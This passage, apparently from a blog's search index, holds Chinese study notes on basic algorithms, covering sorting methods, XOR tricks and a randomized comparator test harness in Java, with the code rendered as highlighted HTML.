punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    heap<span class="token punctuation">.</span><span class="token function">addOrUpdateOrIgnore</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>heap<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        nodeRecord <span class="token keyword">record</span> <span class="token operator">=</span> heap<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Node</span> cur <span class="token operator">=</span> <span class="token keyword">record</span><span class="token punctuation">.</span>node<span class="token punctuation">;</span>        <span class="token keyword">int</span> distance <span class="token operator">=</span> <span class="token keyword">record</span><span class="token punctuation">.</span>distance<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Edge</span> edge<span class="token operator">:</span>cur<span class="token punctuation">.</span>edges<span class="token punctuation">)</span>            heap<span class="token punctuation">.</span><span class="token function">addOrUpdateOrIgnore</span><span class="token punctuation">(</span>edge<span class="token punctuation">.</span><span class="token keyword">to</span><span class="token punctuation">,</span> distance <span class="token operator">+</span> edge<span class="token punctuation">.</span>weight<span class="token punctuation">)</span><span class="token punctuation">;</span>        res<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> distance<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 左程云 </tag>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>左神算法0x01</title>
      <link href="/2021/12/08/%E5%B7%A6%E7%A5%9E%E7%AE%97%E6%B3%950x01/"/>
      <url>/2021/12/08/%E5%B7%A6%E7%A5%9E%E7%AE%97%E6%B3%950x01/</url>
      
        <content type="html"><![CDATA[<p>【各种排序算法原理和应用，对数器，二分法，堆 】</p><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><p>0, 1, 2, …, i, i+1, …, length-1</p><p>从0开始，在[0, length-1]上找到最小值，与arr[0]交换，在[i, length-1]上找到最小值，与arr[i]交换</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">SelectionSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> minIndex <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                minIndex <span class="token operator">=</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">&lt;</span>arr<span class="token punctuation">[</span>minIndex<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span>j<span class="token operator">:</span>minIndex<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> minIndex<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关于<code>swap</code>函数可以采用异或运算的方法写</p><blockquote><ol><li><p> 0 xor n = n, n xor n =0</p></li><li><p> 满足交换结合律</p></li><li><p> (x1, x2, …, xn) 所有数做xor运算与顺序无关</p></li></ol><p>a = m, b = n</p><p>a = a xor b;  a = m xor n, b = n</p><p>b = a xor b;  a = m xor n, b = m xor n xor n = m</p><p>a = a xor b;  a = m xor n xor m = n, b = m</p></blockquote><blockquote><p>a和b的值可以相等，但是不能为相同地址，即不能为arr[i]和arr[i]，两者内存位置相同，会将其清空为0，所以在使用这种编写方法，一定要保证<code>int i</code>和<code>int j</code>不会相同</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Question:</p><p>数组[x1, x2, …, xn]，要求时间复杂度O(n)，空间复杂度O(1)</p><ol><li><p> 有一个数，重复奇数次，其他的数，都重复偶数次，找出这个重复奇数次的数</p></li><li><p> 有两个数，重复奇数次，其他的数，都重复偶数次，找出这两个重复奇数次的数</p></li></ol><blockquote><ol><li><p> 将数组中的所有数异或即可得到</p></li><li><p> 首先还是将数组所有数异或，假设值为m，即m=a xor b，显然a和b一定不相同（-&gt;所以m必然不为0，则m二进制形式至少有一位为1），那么以二进制角度看，a和b的二进制形式中至少有一位是不相同的，假设为第i位，不妨设a第i位为1，b则为0，那么将所有第i位为1的数做异或运算，则得出的值即为a（因为所有第i位为1的只有其他的数和a，b不可能在其中），那么由m=a xor b得 m xor a = b</p></li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printOddTimesNum2</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> cur <span class="token operator">:</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        m <span class="token operator">^=</span> cur<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>            <span class="token keyword">int</span> rightOne <span class="token operator">=</span> m <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">~</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 因为m至少有一位为1，那么找到其最右边的1，rightOne的值假设为000001000</span>    <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 为所求的数的其中之一</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> cur<span class="token operator">:</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 寻找所有第i位为0的数</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>cur <span class="token operator">&amp;</span> rightOne<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// 即第i位如果为0</span>            b <span class="token operator">^=</span> cur<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>b <span class="token operator">+</span><span class="token string">", "</span><span class="token operator">+</span><span class="token punctuation">(</span>m <span class="token operator">^</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><p>0, 1, 2, …, i, i+1, …, length-1</p><p>第一轮：[0, length-1]，arr[0] vs arr[1] 逆序则交换，最后arr[length-1]即为最大</p><p>第二轮：[0, length-2]，交换之后，arr[length-2]即为次大</p><p>遍历所有</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">bubbleSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>arr<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>i<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">></span>arr<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> j<span class="token punctuation">,</span> j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><p>0, 1, 2, …, i, i+1, …, length-1</p><p>[0, 0] 从0往前看，有序则停</p><p>[0, 1] 从1往前看，如果逆序则交换，直至[0, 1]有序</p><p>[0, i] 从i往前看，如果小于前一个数，就进行交换，一直往前交换到前面没有数，或者大于前一个数（即有序）为止</p><blockquote><p>选择排序和冒泡排序与数组排列情况无关，但是插入排序有关，因为如果参数为已经有序的数组，则复杂度为O(n)，否则为O(n2)</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">insertionSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">(</span>j<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">></span>arr<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">swap</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> j<span class="token punctuation">,</span> j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="对数器"><a href="#对数器" class="headerlink" title="对数器"></a>对数器</h2><ol><li><p> 有一个你想要测的方法a</p></li><li><p> 实现复杂度不好但是容易实现的方法b</p></li><li><p> 实现一个随机样本产生器</p></li><li><p> 把方法a和方法b跑相同的随机样本，看看得到的结果是否一样</p></li><li><p> 如果有一个随机样本使得比对结果不一致，打印样本进行人工干预，改对方法a或者 方法b</p></li><li><p> 当样本数量很多时比对测试依然正确，可以确定方法a已经正确</p></li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">comparator</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// Math.random() -> [0,1) 所有的小数，等概率返回一个</span><span class="token comment">// （计算机中是可以实现对[0,1）的所有小数穷举的，因为计算机认为是有限的）</span><span class="token comment">// Math.random() * N -> [0,N) 所有小数，等概率返回一个</span><span class="token comment">// (int)(Math.random() * N) -> [0,N-1] 所有的整数，等概率返回一个</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">generateRandomArray</span><span class="token punctuation">(</span><span class="token keyword">int</span> maxSize<span class="token punctuation">,</span> <span class="token keyword">int</span> maxValue<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 使数组长度随机</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>maxSize <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 使数组的值随机</span>        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>maxValue <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>maxValue <span class="token operator">*</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">copyArray</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isEqual</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr1<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>arr1 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> arr2 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>arr1 <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> arr2 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr1 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> arr2 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr1<span class="token punctuation">.</span>length <span class="token operator">!=</span> arr2<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr1<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>arr1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> arr2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printArray</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> testTime <span class="token operator">=</span> <span class="token number">500000</span><span class="token punctuation">;</span>    <span class="token comment">// 设置数组最大尺寸和最大值</span>    <span class="token keyword">int</span> maxSize <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> maxValue <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>    <span class="token keyword">boolean</span> succeed <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> testTime<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr1 <span class="token operator">=</span> <span class="token function">generateRandomArray</span><span class="token punctuation">(</span>maxSize<span class="token punctuation">,</span> maxValue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr2 <span class="token operator">=</span> <span class="token function">copyArray</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">bubbleSort</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">comparator</span><span class="token punctuation">(</span>arr2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isEqual</span><span class="token punctuation">(</span>arr1<span class="token punctuation">,</span> arr2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            succeed <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>succeed <span class="token operator">?</span> <span class="token string">"Nice!"</span> <span class="token operator">:</span> <span class="token string">"Fucking fucked!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token function">generateRandomArray</span><span class="token punctuation">(</span>maxSize<span class="token punctuation">,</span> maxValue<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printArray</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">bubbleSort</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printArray</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二分法的利用"><a href="#二分法的利用" class="headerlink" title="二分法的利用"></a>二分法的利用</h2><h3 id="在一个有序数组中，找-gt-某个数最左侧的位置"><a href="#在一个有序数组中，找-gt-某个数最左侧的位置" class="headerlink" 